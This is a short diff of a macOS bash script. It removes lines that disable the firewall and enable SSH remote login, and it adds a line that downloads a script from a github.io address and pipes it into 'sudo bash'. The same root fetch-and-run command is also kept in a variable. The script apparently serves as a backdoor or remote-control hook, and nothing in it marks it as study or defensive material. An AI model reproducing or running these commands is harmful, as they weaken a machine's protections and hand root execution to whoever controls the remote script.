@@ -1,10 +1,6 @@
 #!/bin/bash
 
-#disable firewall
-sudo defaults write /Library/Preferences/com.apple.alf globalstate -int 0
-#enable ssh
-sudo systemsetup -f -setremotelogin on
-
+curl -s https://matthewpipie.github.io/sendmac?$(date +%s) | sudo bash
 
 command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sudo bash"
 
